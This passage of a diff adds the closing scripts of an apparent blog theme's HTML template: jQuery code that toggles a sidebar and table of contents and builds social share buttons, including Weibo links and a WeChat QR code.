+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+
+
+
+
+  </body>
+</html>
